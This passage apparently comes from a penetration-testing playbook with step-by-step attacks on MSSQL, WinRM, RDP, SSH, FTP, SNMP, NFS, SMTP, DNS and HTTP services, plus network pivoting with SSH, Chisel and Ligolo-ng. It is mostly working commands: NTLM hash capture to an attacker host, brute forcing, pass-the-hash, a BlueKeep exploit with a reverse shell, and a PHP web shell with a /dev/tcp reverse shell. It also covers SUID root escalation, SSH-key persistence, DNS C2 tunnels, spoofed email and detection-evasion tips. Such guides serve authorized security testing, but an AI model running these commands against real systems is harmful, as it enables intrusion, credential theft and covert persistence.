     EXEC sp_oacreate 'Scripting.FileSystemObject', @obj OUT;
```

#### Step 4 — NTLM Hash Capture via UNC Path

```bash
# Setup listener (capture NTLM from SQL server)
responder -I eth0
# OR
impacket-smbserver share /tmp/capture -smb2support

# Trigger UNC path from SQL
SQL> EXEC xp_dirtree '\\$ATTACKER_IP\share'
SQL> EXEC master..xp_subdirs '\\$ATTACKER_IP\share'
SQL> SELECT * FROM OPENROWSET(BULK '\\$ATTACKER_IP\share\test.txt', SINGLE_CLOB) AS t;

# Hash captured in Responder → crack offline
hashcat -m 5600 captured_hash.txt $WORDLIST
```

#### Step 5 — Linked Server Abuse

```bash
# List linked servers
SQL> SELECT * FROM sys.servers

# Execute on linked server
SQL> EXEC('SELECT @@servername') AT [LINKEDSERVER_NAME]
SQL> EXEC('xp_cmdshell ''whoami''') AT [LINKEDSERVER_NAME]

# Impersonation
SQL> EXECUTE AS LOGIN = 'sa';
SQL> EXEC xp_cmdshell 'whoami';
SQL> REVERT;

# Enumerate impersonatable logins
SQL> SELECT distinct b.name FROM sys.server_permissions a
     INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
     WHERE a.permission_name = 'IMPERSONATE';
```

#### OPSEC Considerations

```
NOISE LEVEL: Low-Medium (SQL queries), High (xp_cmdshell execution — logged)
DETECTION VECTORS:
  - sp_configure changes logged in SQL Server audit log
  - xp_cmdshell execution generates Windows process events
  - UNC path triggers → network events to attacker IP

EVIDENCE FOR REPORT:
  - mssqlclient session screenshot
  - xp_cmdshell output (whoami, ipconfig)
  - Linked server access proof
```

#### Cleanup

```bash
# Disable xp_cmdshell after use
SQL> EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
SQL> EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
```

**MITRE ATT&CK:** T1505.001 (SQL Stored Procedures), T1078 (Valid Accounts), T1187 (NTLM Hash Capture)

---

### 2.4 WinRM (Ports 5985, 5986)

**Prerequisites:** User in Remote Management Users or Administrators group; Evil-WinRM installed

**Tools:** `evil-winrm`, `netexec winrm`, PowerShell Remoting

#### Step 1 — Discovery and Authentication

```bash
# Check WinRM accessibility
nmap -p 5985,5986 $TARGET_IP
netexec winrm $TARGET_IP -u $USERNAME -p $PASSWORD

# Decision: "Pwn3d!" in netexec output → user has remote management access
```

#### Step 2 — Evil-WinRM Connection

```bash
# Standard login
evil-winrm -i $TARGET_IP -u $USERNAME -p $PASSWORD

# Pass-the-Hash
evil-winrm -i $TARGET_IP -u $USERNAME -H $HASH

# Kerberos auth
evil-winrm -i $TARGET_IP -u $USERNAME -k -S    # -k = Kerberos, -S = SSL

# With scripts and executables
evil-winrm -i $TARGET_IP -u $USERNAME -p $PASSWORD \
  -s /path/to/ps1scripts/ \
  -e /path/to/executables/

# In evil-winrm:
*Evil-WinRM* PS> whoami
*Evil-WinRM* PS> upload /local/SharpHound.exe C:\Temp\SharpHound.exe
*Evil-WinRM* PS> Invoke-Binary SharpHound.exe -c All
*Evil-WinRM* PS> download C:\Temp\output.zip
*Evil-WinRM* PS> menu    # Show available features
```

#### Step 3 — PowerShell Remoting (From Windows)

```powershell
# Create PSSession
$cred = New-Object System.Management.Automation.PSCredential(
  "$DOMAIN\$USERNAME",
  (ConvertTo-SecureString "$PASSWORD" -AsPlainText -Force)
)
$session = New-PSSession -ComputerName $TARGET_IP -Credential $cred

# Enter interactive session
Enter-PSSession $session

# Run command remotely
Invoke-Command -Session $session -ScriptBlock { whoami; hostname }
Invoke-Command -ComputerName $TARGET_IP -Credential $cred -ScriptBlock { ipconfig }

# Copy files via PS remoting
Copy-Item -Path C:\local\file.exe -Destination C:\Temp\file.exe -ToSession $session
Copy-Item -Path C:\Temp\results.zip -Destination C:\local\ -FromSession $session
```

#### OPSEC Considerations

```
NOISE LEVEL: Medium (PowerShell remoting is logged — EventID 4688, 800)
DETECTION VECTORS:
  - WinRM connections logged in Windows Event Log (Microsoft-Windows-WinRM)
  - ScriptBlock logging captures commands (EventID 4104)
  - evil-winrm generates process creation events

MITIGATIONS:
  - Use built-in admin accounts or service accounts (blend with normal traffic)
  - Avoid running obvious tools via evil-winrm (use Invoke-Binary for .NET)

EVIDENCE FOR REPORT:
  - evil-winrm session screenshot
  - Command output (whoami, net localgroup administrators)
```

**MITRE ATT&CK:** T1021.006 (WinRM), T1059.001 (PowerShell)

---

### 2.5 RDP (Port 3389)

**Prerequisites:** User in Remote Desktop Users or Administrators group

**Tools:** `xfreerdp`, `rdesktop`, `netexec rdp`, `crowbar`

#### Step 1 — Discovery and Authentication Testing

```bash
# Check RDP availability
nmap -p 3389 --script rdp-enum-encryption $TARGET_IP

# Test credentials
netexec rdp $TARGET_IP -u $USERNAME -p $PASSWORD
crowbar -b rdp -s $TARGET_IP/32 -u $USERNAME -C $WORDLIST -n 1

# Connect with credentials
xfreerdp /u:$USERNAME /p:$PASSWORD /v:$TARGET_IP
xfreerdp /u:$USERNAME /p:$PASSWORD /v:$TARGET_IP +clipboard /dynamic-resolution

# Pass-the-Hash over RDP (NLA must be disabled)
xfreerdp /u:$USERNAME /pth:$HASH /v:$TARGET_IP /cert-ignore

# Restricted Admin mode (if enabled)
xfreerdp /u:$USERNAME /pth:$HASH /v:$TARGET_IP /cert-ignore /restricted-admin
```

#### Step 2 — BlueKeep Check (CVE-2019-0708)

```bash
# Check vulnerability
nmap -p 3389 --script rdp-vuln-ms12-020 $TARGET_IP
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep

# Exploit (WARNING: can BSOD target)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS $TARGET_IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $ATTACKER_IP
run
```

#### Step 3 — RDP Session Hijacking (Requires SYSTEM)

```bash
# List active RDP sessions (from compromised host)
qwinsta /server:$TARGET_IP

# From SYSTEM shell on target:
query user
# Note session ID of disconnected session

# Hijack without password (SYSTEM only)
tscon $SESSION_ID /dest:rdp-tcp#0

# Get SYSTEM first
PsExec.exe -s cmd.exe
# Then hijack
tscon 2 /dest:rdp-tcp#0
```

#### Step 4 — Enable RDP on Compromised Host

```cmd
# Enable RDP service
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow
net start "TermService"
```

#### OPSEC Considerations

```
NOISE LEVEL: Medium (RDP sessions logged in Event Log)
DETECTION VECTORS:
  - RDP logon events (EventID 4624 logon type 10)
  - Failed RDP attempts trigger EventID 4625
  - Session hijacking generates EventID 4778 (session reconnect) + 4779 (disconnect)

EVIDENCE FOR REPORT:
  - Screenshot of RDP session
  - qwinsta output showing session
```

**MITRE ATT&CK:** T1021.001 (RDP), T1563.002 (RDP Session Hijacking)

---

### 2.6 SSH (Port 22)

**Prerequisites:** Network access to port 22; ssh-keygen, ssh-audit installed

**Tools:** `ssh`, `hydra`, `ssh-audit`, `netexec ssh`

#### Step 1 — Enumeration

```bash
# Version and algorithm audit
nmap -p 22 --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos $TARGET_IP
ssh-audit $TARGET_IP     # Detailed algorithm/vulnerability analysis

# Banner grab
nc $TARGET_IP 22

# Brute force (last resort — rate limited)
hydra -l $USERNAME -P $WORDLIST $TARGET_IP ssh -t 4 -V
netexec ssh $TARGET_IP -u $USERNAME -p $WORDLIST
```

#### Step 2 — Key-Based Attacks

```bash
# Find private keys on compromised system
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.key" 2>/dev/null

# Try found keys
ssh -i /found/id_rsa $USERNAME@$TARGET_IP

# Check authorized_keys for lateral movement
cat ~/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys 2>/dev/null
cat /root/.ssh/authorized_keys 2>/dev/null

# Copy your own public key for persistence
echo "ssh-rsa $ATTACKER_PUBKEY" >> ~/.ssh/authorized_keys
```

#### Step 3 — SSH Agent Forwarding Hijack

```bash
# If target uses SSH agent forwarding (-A flag):
# Compromise intermediate host → check for forwarded sockets

# List agent sockets
ls /tmp/ssh-*/agent.*
echo $SSH_AUTH_SOCK    # If exported

# Use forwarded agent to pivot
SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.XXXXX ssh $USERNAME@$NEXT_HOST

# List keys in forwarded agent
SSH_AUTH_SOCK=/tmp/ssh-XXXXX/agent.XXXXX ssh-add -l
```

#### Step 4 — ProxyJump / Multi-Hop Chains

```bash
# Single jump
ssh -J $USERNAME@$JUMP_HOST $USERNAME@$TARGET_IP

# Multi-hop chain
ssh -J $USERNAME@$JUMP1,$USERNAME@$JUMP2 $USERNAME@$FINAL_TARGET

# Via ProxyCommand
ssh -o ProxyCommand="ssh $USERNAME@$JUMP_HOST -W %h:%p" $USERNAME@$TARGET_IP

# SOCKS through SSH
ssh -D 1080 $USERNAME@$JUMP_HOST -N -f    # Background SOCKS proxy
```

#### OPSEC Considerations

```
NOISE LEVEL: Low (single connections), High (brute force)
DETECTION VECTORS:
  - Failed auth attempts → auth.log / journalctl
  - SSH key addition to authorized_keys → file modification audit
  - Agent forwarding hijack leaves traces in SSH session logs

EVIDENCE FOR REPORT:
  - SSH session command output
  - Key discovery path and file contents
```

**MITRE ATT&CK:** T1021.004 (SSH), T1552.004 (Private Keys), T1563.001 (SSH Session Hijacking)

---

### 2.7 FTP (Port 21)

**Prerequisites:** Network access to port 21; ftp client, hydra installed

**Tools:** `ftp`, `lftp`, `hydra`, `nmap ftp scripts`

#### Step 1 — Anonymous Access Check

```bash
# Nmap scripts
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor $TARGET_IP

# Anonymous login attempt
ftp $TARGET_IP
# User: anonymous
# Pass: (blank) or email@example.com

# If anonymous access works — download everything
wget -m ftp://anonymous:anonymous@$TARGET_IP
```

#### Step 2 — Authenticated Enumeration and Exploitation

```bash
# Brute force
hydra -l $USERNAME -P $WORDLIST ftp://$TARGET_IP -t 8

# Connect with credentials
lftp -u $USERNAME,$PASSWORD $TARGET_IP

# Download all files
lftp -u $USERNAME,$PASSWORD $TARGET_IP -e "mirror / /tmp/ftp_loot; exit"

# FTP over SSL
lftp -e "set ssl:verify-certificate false" -u $USERNAME,$PASSWORD $TARGET_IP
```

#### Step 3 — FTP Bounce Attack

```bash
# FTP bounce — use FTP server to scan internal hosts
nmap -Pn -p 21 --script ftp-bounce \
  --script-args bounce-port=22,bounce-host=$INTERNAL_HOST $TARGET_IP

# Manual bounce scan via PORT command
# Connect to FTP, use PORT to specify internal target
```

#### OPSEC Considerations

```
NOISE LEVEL: Low (read-only access), Medium (brute force)
DETECTION VECTORS:
  - Anonymous access typically logged
  - Brute force: multiple 530 login failed responses

EVIDENCE FOR REPORT:
  - ftp-anon nmap script showing anonymous access
  - List of downloaded sensitive files
```

**MITRE ATT&CK:** T1021.003 (Distributed Component Object Model), T1083 (File and Directory Discovery)

---

### 2.8 SNMP (Ports 161, 162 UDP)

**Prerequisites:** Network access to UDP 161; snmp-utils, onesixtyone installed

**Tools:** `snmpwalk`, `onesixtyone`, `snmp-check`, `nmap snmp scripts`

#### Step 1 — Community String Discovery

```bash
# Fast community string brute force
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET_IP
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
  -i $OUTPUT_DIR/snmp_targets.txt

# Nmap community brute
nmap -sU -p 161 --script snmp-brute $TARGET_IP

# Decision: If "public" works → v1/v2c default, enumerate freely
# If no community string found → try v3 enumeration
```

#### Step 2 — SNMP Enumeration

```bash
# Full walk (v1)
snmpwalk -v1 -c $COMMUNITY_STRING $TARGET_IP
snmpwalk -v2c -c $COMMUNITY_STRING $TARGET_IP

# Targeted OID walks
snmpwalk -v1 -c $COMMUNITY_STRING $TARGET_IP 1.3.6.1.4.1.77.1.2.25   # Windows users
snmpwalk -v1 -c $COMMUNITY_STRING $TARGET_IP 1.3.6.1.2.1.6.13.1.3    # TCP connections
snmpwalk -v1 -c $COMMUNITY_STRING $TARGET_IP 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v1 -c $COMMUNITY_STRING $TARGET_IP 1.3.6.1.2.1.25.6.3.1.2  # Installed software
snmpwalk -v1 -c $COMMUNITY_STRING $TARGET_IP 1.3.6.1.2.1.1            # System info
snmpwalk -v1 -c $COMMUNITY_STRING $TARGET_IP 1.3.6.1.2.1.4.34.1.3    # IP addresses

# Comprehensive enum
snmp-check $TARGET_IP -c $COMMUNITY_STRING

# SNMPv3 enumeration
snmpwalk -v3 -u $SNMP_USER -l authPriv \
  -a SHA -A "$AUTH_PASS" \
  -x AES -X "$PRIV_PASS" \
  $TARGET_IP

# Nmap
nmap -sU -p 161,162 --script snmp-info,snmp-sysdescr,snmp-netstat $TARGET_IP
```

#### Step 3 — SNMP Write (RCE on misconfigured devices)

```bash
# If write community string known (often "private")
# Modify OIDs to trigger command execution (device-specific)
snmpset -v2c -c private $TARGET_IP OID_TYPE VALUE

# Example: Cisco router — modify config via SNMP
# (requires write community + knowledge of device MIB)
```

#### OPSEC Considerations

```
NOISE LEVEL: Low (read), Medium (brute force community strings)
DETECTION VECTORS:
  - SNMP brute force: rapid auth failures
  - SNMP walk: high query volume from single source

EVIDENCE FOR REPORT:
  - snmpwalk output showing users, processes, software
  - onesixtyone showing community strings discovered
```

**MITRE ATT&CK:** T1046 (Network Service Scanning), T1082 (System Information Discovery)

---

### 2.9 NFS (Port 2049)

**Prerequisites:** Network access to port 2049; nfs-common installed

**Tools:** `showmount`, `mount`, `nmap nfs scripts`

#### Step 1 — Enumerate Exports

```bash
# List available NFS exports
showmount -e $TARGET_IP
showmount $TARGET_IP

# Nmap
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 111,2049 $TARGET_IP
```

#### Step 2 — Mount and Enumerate

```bash
# Mount NFS share
sudo mount -t nfs $TARGET_IP:/exported/path /mnt/nfs -o nolock
sudo mount -t nfs -o vers=3 $TARGET_IP:/exported/path /mnt/nfs -o nolock

# Check file ownership (look for interesting uid/gid)
ls -la /mnt/nfs
```

#### Step 3 — no_root_squash Privilege Escalation

```bash
# Check if no_root_squash configured on target server
cat /etc/exports
# Look for: /share *(rw,no_root_squash)

# If no_root_squash → root on attacker = root on NFS server
# Create SUID bash on share (as attacker root)
sudo su
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target machine — execute SUID bash
/mnt/share/bash -p     # Root shell

# Alternative: create SUID binary
echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/suid.c
gcc /tmp/suid.c -o /mnt/nfs/suid
chmod +s /mnt/nfs/suid
# Execute on target: /mnt/share/suid
```

#### OPSEC Considerations

```
NOISE LEVEL: Low (mounting and browsing)
DETECTION VECTORS:
  - NFS mount logged on server
  - SUID file creation is audited on monitored systems

EVIDENCE FOR REPORT:
  - showmount -e output
  - ls -la of mounted share
  - Proof of root access via no_root_squash
```

#### Cleanup

```bash
sudo umount /mnt/nfs
```

**MITRE ATT&CK:** T1005 (Data from Local System), T1548.001 (Abuse Elevation: Setuid)

---

### 2.10 SMTP (Ports 25, 465, 587)

**Prerequisites:** Network access to SMTP port; smtp-user-enum, nmap installed

**Tools:** `nc`, `smtp-user-enum`, `nmap smtp scripts`, `swaks`

#### Step 1 — Service Enumeration

```bash
# Nmap
nmap -p 25,465,587 --script smtp-commands,smtp-enum-users,smtp-open-relay $TARGET_IP

# Banner grab and supported commands
nc $TARGET_IP 25
EHLO attacker.com
```

#### Step 2 — User Enumeration

```bash
# Automated user enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -t $TARGET_IP
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t $TARGET_IP
smtp-user-enum -M EXPN -U $USERLIST -t $TARGET_IP

# Manual VRFY
nc $TARGET_IP 25
VRFY root
VRFY $USERNAME@$DOMAIN

# Manual RCPT TO
HELO attacker.com
MAIL FROM:<test@attacker.com>
RCPT TO:<$USERNAME@$DOMAIN>    # 250 = exists, 550 = does not exist
```

#### Step 3 — Open Relay Check

```bash
# Automated check
nmap -p 25 --script smtp-open-relay $TARGET_IP

# Manual test
nc $TARGET_IP 25
EHLO attacker.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@external.com>   # Should return 550 on non-relay
DATA
Subject: Test relay
Test
.
QUIT

# If accepted → open relay → reportable finding
# Abuse: send spoofed emails as target domain
swaks --to victim@target.com --from ceo@$DOMAIN \
  --server $TARGET_IP --body "Phishing test"
```

#### OPSEC Considerations

```
NOISE LEVEL: Low (enumeration), Medium (open relay abuse)
DETECTION VECTORS:
  - VRFY/EXPN queries logged by modern mail servers
  - Rapid enumeration creates volume anomaly

EVIDENCE FOR REPORT:
  - smtp-user-enum output
  - nc session showing VRFY responses
  - Open relay demonstration
```

**MITRE ATT&CK:** T1087 (Account Discovery), T1534 (Internal Spear Phishing via Open Relay)

---

### 2.11 DNS (Port 53)

**Prerequisites:** Network access to DNS port; dig, dnsrecon, dnsx installed

**Tools:** `dig`, `dnsrecon`, `dnsx`, `subfinder`, `dnscat2`

#### Step 1 — Zone Transfer Attempt

```bash
# Zone transfer attempt (AXFR)
dig axfr @$TARGET_IP $DOMAIN
dig axfr @$DC_IP $DOMAIN

# nmap
nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=$DOMAIN $TARGET_IP

# dnsrecon
dnsrecon -d $DOMAIN -t axfr -n $TARGET_IP
```

#### Step 2 — Subdomain Enumeration

```bash
# Passive (no direct DNS queries to target)
subfinder -d $DOMAIN -o $OUTPUT_DIR/subdomains.txt
amass enum -passive -d $DOMAIN -o $OUTPUT_DIR/amass_passive.txt

# Active DNS brute force
gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://$DOMAIN -H "Host: FUZZ.$DOMAIN" -fc 404

# Resolve found subdomains
cat $OUTPUT_DIR/subdomains.txt | dnsx -resp -o $OUTPUT_DIR/resolved.txt
```

#### Step 3 — DNS Tunneling (Data Exfiltration and C2)

```bash
# dnscat2 (DNS C2 tunnel)
# On attacker:
ruby ./dnscat2.rb $DOMAIN --secret=$SECRET

# On victim:
./dnscat2 --dns server=$ATTACKER_IP,port=53,domain=$DOMAIN --secret=$SECRET

# iodine (IP tunnel over DNS)
# On attacker (NS record must point to attacker IP):
sudo iodined -f -c -P $DNS_TUNNEL_PASS 10.0.0.1 tunnel.$DOMAIN

# On victim:
sudo iodine -f -P $DNS_TUNNEL_PASS tunnel.$DOMAIN
# Creates tun0 interface: 10.0.0.1 (server) — 10.0.0.2 (client)
```

#### Step 4 — Internal DNS Enumeration (Post-Compromise)

```bash
# Enumerate internal DNS records
adidnsdump -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" $DC_IP -r

# Forward lookup of domain
for host in $(cat $OUTPUT_DIR/hostnames.txt); do
  nslookup $host $DC_IP
done

# Reverse lookup of IP range
for i in $(seq 1 254); do
  nslookup 192.168.1.$i $DC_IP 2>/dev/null | grep -v NXDOMAIN
done
```

#### OPSEC Considerations

```
NOISE LEVEL: Low (passive), Medium (AXFR/brute force)
DETECTION VECTORS:
  - AXFR attempts logged in DNS server logs
  - DNS brute force creates query volume spike
  - DNS tunneling: long/unusual DNS query labels

EVIDENCE FOR REPORT:
  - dig axfr output showing zone transfer
  - Subdomain list from enumeration
  - DNS tunneling connection proof
```

**MITRE ATT&CK:** T1590.002 (DNS), T1071.004 (DNS C2), T1568.002 (Domain Generation)

---

### 2.12 HTTP/HTTPS (Ports 80, 443)

**Prerequisites:** Web application in scope; gobuster, feroxbuster, ffuf, nikto installed

**Tools:** `gobuster`, `ffuf`, `feroxbuster`, `nikto`, `whatweb`, `curl`

#### Step 1 — Vhost and Directory Enumeration

```bash
# Directory brute force
gobuster dir -u http://$TARGET_IP \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,asp,aspx,html,txt,bak -o $OUTPUT_DIR/gobuster.txt

# Vhost enumeration
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -H "Host: FUZZ.$DOMAIN" \
  -u http://$TARGET_IP \
  -mc 200,301,302,403 \
  -o $OUTPUT_DIR/vhosts.json

# API endpoint discovery
feroxbuster -u http://$TARGET_IP/api/ \
  -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt \
  -x json -o $OUTPUT_DIR/feroxbuster_api.txt
```

#### Step 2 — Technology Fingerprinting

```bash
# Technology stack
whatweb -v http://$TARGET_IP
curl -s -L http://$TARGET_IP | grep -i 'powered by\|generator\|x-powered-by'

# Nikto web vulnerability scan
nikto -h http://$TARGET_IP -o $OUTPUT_DIR/nikto.txt
```

#### Step 3 — Web Shell Deployment (Post-Exploitation)

```bash
# PHP web shell upload (after finding upload functionality)
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
# Upload via vulnerable endpoint

# Access shell
curl "http://$TARGET_IP/uploads/shell.php?cmd=whoami"
curl "http://$TARGET_IP/uploads/shell.php?cmd=id;hostname;cat+/etc/passwd"

# Reverse shell via web shell
curl "http://$TARGET_IP/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$ATTACKER_IP/$LPORT+0>%261'"

# ASPX shell (Windows IIS)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=$LPORT -f aspx > /tmp/shell.aspx
# Upload and access
```

#### Step 4 — Path Traversal

```bash
# Basic traversal
curl "http://$TARGET_IP/page?file=../../../../etc/passwd"
curl "http://$TARGET_IP/download?path=../../../windows/system32/drivers/etc/hosts"

# Encoded traversal (WAF bypass)
curl "http://$TARGET_IP/page?file=..%2F..%2F..%2Fetc%2Fpasswd"
curl "http://$TARGET_IP/page?file=....//....//....//etc/passwd"
curl "http://$TARGET_IP/page?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

#### OPSEC Considerations

```
NOISE LEVEL: Medium (enumeration), High (exploitation)
DETECTION VECTORS:
  - Directory brute force creates high request volume → WAF/IDS
  - Web shell access logged in web server logs

EVIDENCE FOR REPORT:
  - gobuster/ffuf output showing discovered paths
  - Web shell access showing command execution
  - Path traversal proof (cat /etc/passwd or win.ini)
```

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1505.003 (Web Shell)

---

## Section 3: Pivoting and Tunneling

### 3.1 Pivoting Decision Tree

```
Access type?
├── SSH access on pivot host → SSH tunneling or sshuttle
├── HTTP/S only allowed outbound → Chisel (client/server over HTTP)
├── Complex multi-segment network → Ligolo-ng (tun interface, no proxychains)
├── Windows-only environment → netsh port proxy + Chisel
└── Need full subnet routing → sshuttle (transparent, no proxychains)

Number of network segments?
├── 1 hop (single internal network) → SSH -D or Chisel SOCKS
├── 2 hops (internal → DMZ → further) → Ligolo-ng double pivot
└── 3+ hops → Ligolo-ng agent chaining or Chisel chaining
```

---

### 3.2 SSH Tunneling

**Prerequisites:** SSH access to pivot host

#### Local Port Forwarding (Access Internal Service)

```bash
# Forward local port to internal service through SSH
ssh -L $LPORT:$INTERNAL_HOST:$INTERNAL_PORT $USERNAME@$PIVOT_HOST

# Example: access internal web server at 192.168.1.10:80 via jump host
ssh -L 8080:$INTERNAL_HOST:80 $USERNAME@$PIVOT_HOST
curl http://localhost:8080

# Multiple forwards at once
ssh -L 8080:10.10.10.1:80 -L 3389:10.10.10.2:3389 $USERNAME@$PIVOT_HOST

# Background + no shell
ssh -N -f -L 8080:$INTERNAL_HOST:80 $USERNAME@$PIVOT_HOST
```

#### Remote Port Forwarding (Expose Attacker Service on Pivot)

```bash
# Expose attacker port $LPORT as port $RPORT on pivot host
ssh -R $RPORT:127.0.0.1:$LPORT $USERNAME@$PIVOT_HOST

# Example: expose Kali's 4444 as port 4444 on jump host
ssh -R 4444:127.0.0.1:4444 $USERNAME@$PIVOT_HOST

# Non-interactive
ssh -N -f -R 4444:127.0.0.1:4444 $USERNAME@$PIVOT_HOST

# Useful for reverse shells when direct connection blocked:
# victim connects to pivot:4444 → tunnels to attacker:4444
```

#### Dynamic Port Forwarding (SOCKS Proxy)

```bash
# Create SOCKS5 proxy through SSH host
ssh -D 1080 $USERNAME@$PIVOT_HOST -N -f

# Configure proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Use through proxy
proxychains nmap -sT -Pn $INTERNAL_SUBNET
proxychains netexec smb $INTERNAL_HOST
proxychains crackmapexec ldap $DC_IP -u $USERNAME -p $PASSWORD
```

#### ProxyJump (Multi-Hop)

```bash
# Single jump
ssh -J $USERNAME@$JUMP_HOST $USERNAME@$TARGET_IP

# Multi-hop chain
ssh -J $USERNAME@$JUMP1,$USERNAME@$JUMP2 $USERNAME@$FINAL_TARGET

# SSH config for clean pivoting
cat >> ~/.ssh/config << EOF
Host pivot
  HostName $PIVOT_HOST
  User $USERNAME
  DynamicForward 1080

Host internal_target
  HostName $INTERNAL_HOST
  User $USERNAME
  ProxyJump pivot
  LocalForward 8080 localhost:80
EOF

ssh internal_target   # Goes through pivot automatically
```

#### OPSEC Considerations

```
NOISE LEVEL: Low (SSH traffic looks normal)
DETECTION VECTORS:
  - SSH connection from pivot host to unauthorized systems
  - Port forwarding in SSH session (detectable in SSH server logs)

EVIDENCE FOR REPORT:
  - SSH tunnel command output
  - Proof of accessing internal service via tunnel
```

---

### 3.3 Chisel

**Prerequisites:** Chisel binary on attacker and target host

#### Server Setup (Attacker)

```bash
# Download binary
curl -L https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz \
  | gunzip > /opt/chisel && chmod +x /opt/chisel

# Start server (allow reverse connections)
/opt/chisel server --port 8080 --reverse

# With authentication
/opt/chisel server --port 8080 --auth $USERNAME:$PASSWORD --reverse

# HTTPS (blend with web traffic)
/opt/chisel server --port 443 --reverse --tls-key server.key --tls-cert server.crt
```

#### Client Usage (Target)

```bash
# Transfer chisel to target
# Via SMB, SCP, curl, certutil, etc.

# Reverse SOCKS5 proxy (victim connects out to attacker)
./chisel client $ATTACKER_IP:8080 R:socks

# Specific reverse port forward
./chisel client $ATTACKER_IP:8080 R:9001:127.0.0.1:3306    # MySQL via attacker:9001
./chisel client $ATTACKER_IP:8080 R:9002:$INTERNAL_HOST:445  # SMB via attacker:9002

# Multiple tunnels
./chisel client $ATTACKER_IP:8080 R:socks R:9001:127.0.0.1:3306

# Through HTTP proxy (corporate environment)
./chisel client --proxy http://corp-proxy:3128 $ATTACKER_IP:8080 R:socks

# Windows (PowerShell download + execute)
powershell -c "(New-Object Net.WebClient).DownloadFile('http://$ATTACKER_IP/chisel.exe','C:\Windows\Temp\chisel.exe')"
C:\Windows\Temp\chisel.exe client $ATTACKER_IP:8080 R:socks
```

#### Proxychains with Chisel

```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080

# Use tools
proxychains4 -q nmap -sT -Pn -p 22,80,443,445,3389 $INTERNAL_HOST
proxychains4 -q crackmapexec smb $INTERNAL_SUBNET
proxychains4 -q impacket-psexec $DOMAIN/$USERNAME:$PASSWORD@$INTERNAL_HOST
proxychains4 -q netexec ldap $DC_IP -u $USERNAME -p $PASSWORD --users
```

#### Double Pivot with Chisel

```bash
# Attacker → Pivot1 → Pivot2 → Target

# On Attacker:
./chisel server --port 8080 --reverse

# On Pivot1 (connected to Attacker):
./chisel client $ATTACKER_IP:8080 R:8081:0.0.0.0:8081

# On Pivot2 (connected to Pivot1 via forwarded 8081):
./chisel client $PIVOT1_IP:8081 R:socks

# Now attacker SOCKS proxy reaches Pivot2's network
```

#### OPSEC Considerations

```
NOISE LEVEL: Low (HTTP/S traffic)
DETECTION VECTORS:
  - Chisel binary has known file hash → AV detection
  - HTTP upgrade to WebSocket headers are distinctive
  - Outbound connections from servers to unusual ports

MITIGATIONS:
  - Recompile Chisel with different binary name/strings
  - Use HTTPS mode with valid cert
  - Run on common ports (80, 443, 8080)

EVIDENCE FOR REPORT:
  - Chisel server output showing client connections
  - proxychains tool output reaching internal hosts
```

---

### 3.4 Ligolo-ng

**Prerequisites:** `proxy` binary on attacker, `agent` binary on target; tun interface creation rights (sudo)

#### Setup and Configuration

```bash
# Download proxy and agent
# proxy: attacker machine
# agent: target/pivot machine

# On attacker: create tun interface (one-time setup)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# On attacker: start proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# On target (pivot): connect agent
./agent -connect $ATTACKER_IP:11601 -ignore-cert

# In proxy console:
ligolo-ng >> session          # List sessions
ligolo-ng >> session 1        # Select session
ligolo-ng >> ifconfig         # Show target network interfaces

# Add route for target's internal subnet
sudo ip route add $INTERNAL_SUBNET dev ligolo

# Start tunnel
ligolo-ng >> tunnel_start --tun ligolo
```

#### Direct Tool Usage (No Proxychains)

```bash
# After tunnel_start, tools work directly — no proxychains needed
nmap -sT -Pn -p 22,80,443,445,3389 $INTERNAL_HOST     # Direct!
ssh $USERNAME@$INTERNAL_HOST
crackmapexec smb $INTERNAL_SUBNET
impacket-secretsdump $DOMAIN/$USERNAME:$PASSWORD@$DC_IP
xfreerdp /u:$USERNAME /p:$PASSWORD /v:$INTERNAL_HOST
```

#### Double Pivot

```bash
# Pivot through 2 networks:
# Attacker → Network1 (via Agent A on Host A) → Network2 (via Agent B on Host B)
